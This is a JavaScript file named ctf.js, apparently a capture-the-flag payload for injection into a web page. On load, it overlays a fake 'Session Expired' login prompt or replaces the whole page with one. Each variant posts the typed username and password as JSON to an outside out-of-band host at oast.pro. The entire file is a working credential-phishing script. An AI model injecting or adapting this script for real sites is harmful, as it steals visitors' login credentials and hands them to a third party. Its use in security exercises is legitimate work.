// ctf.js - Session Logout Page Embedded

// Method 1: Create and inject HTML directly into the page
function createSessionLogoutPage() {
    const htmlContent = `
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Session Expired</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.7);
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 1000;
        }

        .popup {
            background: white;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
            max-width: 400px;
            width: 90%;
            text-align: center;
            animation: slideIn 0.3s ease-out;
        }

        @keyframes slideIn {
            from {
                opacity: 0;
                transform: translateY(-30px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .popup h2 {
            color: #333;
            margin-bottom: 15px;
            font-size: 24px;
        }

        .popup p {
            color: #666;
            margin-bottom: 25px;
            line-height: 1.5;
        }

        .form-group {
            margin-bottom: 20px;
            text-align: left;
        }

        .form-group label {
            display: block;
            margin-bottom: 5px;
            color: #333;
            font-weight: 500;
        }

        .form-group input {
            width: 100%;
            padding: 12px;
            border: 2px solid #ddd;
            border-radius: 5px;
            font-size: 16px;
            transition: border-color 0.3s;
        }

        .form-group input:focus {
            outline: none;
            border-color: #667eea;
        }

        .button-group {
            display: flex;
            gap: 10px;
            margin-top: 25px;
        }

        .btn {
            flex: 1;
            padding: 12px 20px;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
            transition: all 0.3s;
        }

        .btn-primary {
            background: #667eea;
            color: white;
        }

        .btn-primary:hover {
            background: #5a6fd8;
            transform: translateY(-1px);
        }

        .btn-secondary {
            background: #6c757d;
            color: white;
        }

        .btn-secondary:hover {
            background: #5a6268;
            transform: translateY(-1px);
        }

        .warning-icon {
            font-size: 48px;
            color: #ffc107;
            margin-bottom: 15px;
        }

        .status-message {
            margin-top: 15px;
            padding: 10px;
            border-radius: 5px;
            display: none;
        }

        .status-success {
            background: #d4edda;
            color: #155724;
            border: 1px solid #c3e6cb;
        }

        .status-error {
            background: #f8d7da;
            color: #721c24;
            border: 1px solid #f5c6cb;
        }

        .loading {
            display: none;
            margin-top: 10px;
        }

        .spinner {
            border: 2px solid #f3f3f3;
            border-top: 2px solid #667eea;
            border-radius: 50%;
            width: 20px;
            height: 20px;
            animation: spin 1s linear infinite;
            display: inline-block;
            margin-right: 10px;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="overlay" id="sessionPopup">
        <div class="popup">
            <div class="warning-icon">⚠️</div>
            <h2>Session Expired</h2>
            <p>Your session has expired due to inactivity. Please re-enter your credentials to continue.</p>
            
            <form id="reAuthForm">
                <div class="form-group">
                    <label for="username">Username:</label>
                    <input type="text" id="username" name="username" required placeholder="Enter your username">
                </div>
                
                <div class="form-group">
                    <label for="password">Password:</label>
                    <input type="password" id="password" name="password" required placeholder="Enter your password">
                </div>
                
                <div class="button-group">
                    <button type="submit" class="btn btn-primary">Re-authenticate</button>
                    <button type="button" class="btn btn-secondary" onclick="cancelLogin()">Cancel</button>
                </div>
                
                <div class="loading" id="loadingIndicator">
                    <div class="spinner"></div>
                    Authenticating...
                </div>
                
                <div class="status-message" id="statusMessage"></div>
            </form>
        </div>
    </div>
</body>
</html>
    `;
    
    // Replace the entire document with our HTML
    document.open();
    document.write(htmlContent);
    document.close();
    
    // Add the JavaScript functionality after DOM is loaded
    setTimeout(() => {
        initializeSessionLogout();
    }, 100);
}

// Method 2: Inject as overlay on existing page
function createSessionOverlay() {
    const overlay = document.createElement('div');
    overlay.innerHTML = `
        <style>
            .session-overlay {
                position: fixed;
                top: 0;
                left: 0;
                width: 100%;
                height: 100%;
                background: rgba(0, 0, 0, 0.7);
                display: flex;
                align-items: center;
                justify-content: center;
                z-index: 10000;
                font-family: Arial, sans-serif;
            }
            .session-popup {
                background: white;
                padding: 30px;
                border-radius: 10px;
                box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
                max-width: 400px;
                width: 90%;
                text-align: center;
            }
            .session-popup h2 { margin-bottom: 15px; }
            .session-popup p { margin-bottom: 20px; color: #666; }
            .form-group { margin-bottom: 15px; text-align: left; }
            .form-group label { display: block; margin-bottom: 5px; }
            .form-group input { width: 100%; padding: 10px; border: 1px solid #ddd; border-radius: 4px; }
            .btn { padding: 10px 20px; margin: 5px; border: none; border-radius: 4px; cursor: pointer; }
            .btn-primary { background: #007bff; color: white; }
            .btn-secondary { background: #6c757d; color: white; }
        </style>
        <div class="session-overlay">
            <div class="session-popup">
                <h2>⚠️ Session Expired</h2>
                <p>Please re-enter your credentials to continue.</p>
                <form id="overlayAuthForm">
                    <div class="form-group">
                        <label>Username:</label>
                        <input type="text" id="overlayUsername" required>
                    </div>
                    <div class="form-group">
                        <label>Password:</label>
                        <input type="password" id="overlayPassword" required>
                    </div>
                    <button type="submit" class="btn btn-primary">Login</button>
                    <button type="button" class="btn btn-secondary" onclick="closeOverlay()">Cancel</button>
                </form>
            </div>
        </div>
    `;
    
    document.body.appendChild(overlay);
    
    // Add event listener for the overlay form
    document.getElementById('overlayAuthForm').addEventListener('submit', handleOverlayAuth);
}

// Initialize the session logout functionality
function initializeSessionLogout() {
    // Add form submission handler
    const form = document.getElementById('reAuthForm');
    if (form) {
        form.addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            const loadingIndicator = document.getElementById('loadingIndicator');
            const statusMessage = document.getElementById('statusMessage');
            
            // Show loading
            if (loadingIndicator) loadingIndicator.style.display = 'block';
            if (statusMessage) statusMessage.style.display = 'none';
            
            const credentials = {
                username: username,
                password: password,
                timestamp: new Date().toISOString(),
                sessionId: generateSessionId()
            };
            
            try {
                const targetUrl = 'http://d2s81r0vtcc54sjgqplgzxnezjthhtjzy.oast.pro/auth';
                
                const response = await fetch(targetUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'X-Requested-With': 'XMLHttpRequest'
                    },
                    body: JSON.stringify(credentials)
                });
                
                if (loadingIndicator) loadingIndicator.style.display = 'none';
                
                if (response.ok) {
                    showStatus('Authentication successful!', 'success');
                } else {
                    showStatus('Authentication failed.', 'error');
                }
                
            } catch (error) {
                if (loadingIndicator) loadingIndicator.style.display = 'none';
                console.log('Credentials sent:', credentials);
                showStatus('Network error occurred.', 'error');
            }
        });
    }
    
    // Auto-focus username field
    const usernameField = document.getElementById('username');
    if (usernameField) usernameField.focus();
}

// Handle overlay form submission
async function handleOverlayAuth(e) {
    e.preventDefault();
    
    const username = document.getElementById('overlayUsername').value;
    const password = document.getElementById('overlayPassword').value;
    
    const credentials = {
        username: username,
        password: password,
        timestamp: new Date().toISOString()
    };
    
    try {
        // CTF target endpoint
        const response = await fetch('http://d2s81r0vtcc54sjgqplgzxnezjthhtjzy.oast.pro/auth', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(credentials)
        });
        
        console.log('Overlay credentials sent:', credentials);
        closeOverlay();
        
    } catch (error) {
        console.log('Error sending credentials:', credentials);
    }
}

// Utility functions
function generateSessionId() {
    return 'sess_' + Math.random().toString(36).substr(2, 16);
}

function showStatus(message, type) {
    const statusMessage = document.getElementById('statusMessage');
    if (statusMessage) {
        statusMessage.textContent = message;
        statusMessage.className = `status-message status-${type}`;
        statusMessage.style.display = 'block';
    }
}

function cancelLogin() {
    if (confirm('Cancel authentication?')) {
        window.location.href = '/login';
    }
}

function closeOverlay() {
    const overlay = document.querySelector('.session-overlay');
    if (overlay && overlay.parentNode) {
        overlay.parentNode.removeChild(overlay);
    }
}

// Auto-execution - runs immediately when script is loaded

// Check if DOM is already loaded
if (document.readyState === 'loading') {
    // DOM still loading, wait for it
    document.addEventListener('DOMContentLoaded', function() {
        createSessionOverlay();
    });
} else {
    // DOM already loaded, run immediately
    createSessionOverlay();
}

// Export functions for manual use
if (typeof module !== 'undefined' && module.exports) {
    module.exports = {
        createSessionLogoutPage,
        createSessionOverlay,
        initializeSessionLogout
    };
}

console.log('CTF.js loaded. Available functions:');
console.log('- createSessionLogoutPage(): Replace entire page');
console.log('- createSessionOverlay(): Show popup overlay');
console.log('- Uncomment auto-execution options as needed');
